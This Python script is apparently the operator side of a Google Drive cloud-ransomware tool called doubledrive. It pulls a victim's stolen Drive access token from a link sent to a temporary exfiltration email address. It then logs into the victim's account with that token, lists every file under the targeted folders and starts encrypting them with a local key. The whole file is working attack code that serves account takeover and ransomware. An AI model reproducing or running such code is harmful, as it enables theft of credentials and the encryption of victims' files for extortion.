import yaml
import requests

from doubledrive.endpoint_takeover_utils.temp_email import TempEmail
from doubledrive.cloud_drive.google_drive.google_drive import GoogleDrive
from doubledrive.cloud_drive.google_drive.google_drive_item import GoogleDriveFileItem
from doubledrive.cloud_ransomware.google_drive_ransomware import GoogleDriveRansomware
from config import get_configs, ConfigKey
from victim_info_key import VictimInfoKey

EMAIL_SHARE_LINK_BEGINING = "https://drive.google.com/file/d/"

def get_victim_info_file_id_from_email(email: str) -> str:
    temp_email = TempEmail(email)
    messages = temp_email.get_messages()
    last_message = messages[0]
    file_link_index = last_message.content.find(EMAIL_SHARE_LINK_BEGINING)
    file_id_index = file_link_index + len(EMAIL_SHARE_LINK_BEGINING) 
    slash_after_file_id_index = last_message.content[file_id_index:].find("/") + file_id_index
    file_id = last_message.content[file_id_index:slash_after_file_id_index]

    return file_id


def read_public_google_drive_text_file_by_id(file_id: str) -> bytes:
    res = requests.get(f"https://drive.google.com/uc?id={file_id}&export=download")
    res.raise_for_status()
    return res.content


def get_ransomware_targets(google_drive_session: GoogleDrive, victim_info: dict):
    target_file_items = []
    google_drive_ids_to_target_paths = victim_info[VictimInfoKey.IDS_TO_TARGET_PATHS.value]

    for google_drive_folder_id in google_drive_ids_to_target_paths.keys():
        google_drive_folder_item = google_drive_session.get_item_by_id(google_drive_folder_id)
        for item in google_drive_session.list_children_recursively(google_drive_folder_item):
            if isinstance(item, GoogleDriveFileItem):
                target_file_items.append(item)

    return target_file_items


def main():
    configs = get_configs()

    victim_info_file_id = get_victim_info_file_id_from_email(configs[ConfigKey.EXFILTRATION_EMAIL_ADDRESS.value])
    victim_info_file_content = read_public_google_drive_text_file_by_id(victim_info_file_id)
    victim_info = yaml.safe_load(victim_info_file_content)

    google_drive = GoogleDrive()
    google_drive.login_using_token(victim_info[VictimInfoKey.TOKEN.value])

    target_file_items = get_ransomware_targets(google_drive, victim_info)
    cloud_ransomware = GoogleDriveRansomware(google_drive, "./key.key")
    cloud_ransomware.start_ransomware(target_file_items)


if "__main__" == __name__:
    main()